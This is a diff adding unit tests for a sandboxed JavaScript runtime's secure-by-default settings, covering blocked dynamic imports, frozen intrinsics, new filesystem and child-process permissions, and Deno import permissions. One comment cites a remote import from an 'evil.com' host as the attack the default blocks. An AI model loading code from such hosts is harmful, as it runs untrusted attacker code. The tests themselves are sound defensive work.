@@ -37,6 +37,56 @@ describe('AxJSRuntimePermission', () => {
     expect(AxJSRuntimePermission.COMMUNICATION).toBe('communication');
     expect(AxJSRuntimePermission.TIMING).toBe('timing');
     expect(AxJSRuntimePermission.WORKERS).toBe('workers');
+    expect(AxJSRuntimePermission.FILESYSTEM).toBe('filesystem');
+    expect(AxJSRuntimePermission.CHILD_PROCESS).toBe('child-process');
+  });
+});
+
+describe('AxJSRuntime secure defaults', () => {
+  it('init message carries secure-by-default lockdown flags', () => {
+    const interp = new AxJSRuntime();
+    interp.createSession();
+
+    const initMsg = mockPostMessage.mock.calls[0]![0];
+    expect(initMsg.blockDynamicImport).toBe(true);
+    expect(initMsg.blockShadowRealm).toBe(true);
+    expect(initMsg.freezeIntrinsics).toBe(true);
+    expect(initMsg.lockWorkerIPC).toBe(true);
+    expect(initMsg.preventGlobalThisExtensions).toBe(false);
+    expect(initMsg.allowedModules).toEqual([]);
+  });
+
+  it('propagates explicit overrides into init message', () => {
+    const interp = new AxJSRuntime({
+      blockDynamicImport: false,
+      blockShadowRealm: false,
+      freezeIntrinsics: false,
+      lockWorkerIPC: false,
+      preventGlobalThisExtensions: true,
+      allowedModules: ['node:fs', 'node:path'],
+    });
+    interp.createSession();
+
+    const initMsg = mockPostMessage.mock.calls[0]![0];
+    expect(initMsg.blockDynamicImport).toBe(false);
+    expect(initMsg.blockShadowRealm).toBe(false);
+    expect(initMsg.freezeIntrinsics).toBe(false);
+    expect(initMsg.lockWorkerIPC).toBe(false);
+    expect(initMsg.preventGlobalThisExtensions).toBe(true);
+    expect(initMsg.allowedModules).toEqual(['node:fs', 'node:path']);
+  });
+
+  it('propagates new permissions (FILESYSTEM, CHILD_PROCESS)', () => {
+    const interp = new AxJSRuntime({
+      permissions: [
+        AxJSRuntimePermission.FILESYSTEM,
+        AxJSRuntimePermission.CHILD_PROCESS,
+      ],
+    });
+    interp.createSession();
+
+    const initMsg = mockPostMessage.mock.calls[0]![0];
+    expect(initMsg.permissions).toEqual(['filesystem', 'child-process']);
   });
 });
 
@@ -643,6 +693,29 @@ describe('AxJSRuntime', () => {
     const workerOptions = workerCtorCall[1] as Record<string, unknown>;
 
     expect(workerOptions.type).toBe('module');
+    // With NETWORK granted and allowDenoRemoteImport: false (the secure
+    // default), the Deno permission map includes `import: false` so that
+    // granting fetch does not also enable `import('https://evil.com/…')`.
+    expect(workerOptions.deno).toEqual({
+      permissions: { net: true, import: false },
+    });
+  });
+
+  it('permits Deno remote imports when allowDenoRemoteImport: true', () => {
+    (globalThis as { Deno?: unknown }).Deno = { version: { deno: '2.6.3' } };
+
+    const interp = new AxJSRuntime({
+      permissions: [AxJSRuntimePermission.NETWORK],
+      allowDenoRemoteImport: true,
+    });
+    interp.createSession();
+
+    const WorkerMock = vi.mocked(
+      globalThis.Worker as unknown as ReturnType<typeof vi.fn>
+    );
+    const workerCtorCall = WorkerMock.mock.calls[0]!;
+    const workerOptions = workerCtorCall[1] as Record<string, unknown>;
+
     expect(workerOptions.deno).toEqual({
       permissions: { net: true },
     });
